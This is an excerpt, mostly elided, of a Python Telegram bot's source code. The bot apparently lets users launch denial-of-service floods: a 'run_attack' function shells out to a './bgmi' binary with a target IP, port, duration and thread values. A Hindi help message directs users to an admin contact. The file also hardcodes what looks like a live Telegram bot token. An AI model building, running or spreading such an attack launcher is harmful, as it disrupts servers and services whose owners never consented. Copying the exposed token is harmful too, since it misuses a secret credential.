...
TELEGRAM_BOT_TOKEN = '7686606251:AAGLngp85Rgw1p0yWq4g56XVqNDjvqtdxHI'  # Replace with your bot token
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} {300} {900}"
...
async def help(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "- *Agar koi dikkat aaye toh admin ko contact karo: @lostboixd*\n\n"
